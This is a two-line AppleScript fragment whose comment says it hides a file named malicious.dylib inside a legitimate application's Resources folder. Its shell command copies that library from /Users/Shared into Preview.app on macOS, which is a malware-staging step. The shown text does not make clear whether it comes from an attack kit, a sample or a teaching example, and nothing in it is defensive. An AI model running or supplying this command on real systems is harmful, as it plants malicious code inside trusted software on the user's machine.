-- Hides malicious.dylib inside a legitimate app’s Resources
do shell script "cp /Users/Shared/malicious.dylib /Applications/Preview.app/Contents/Resources/"
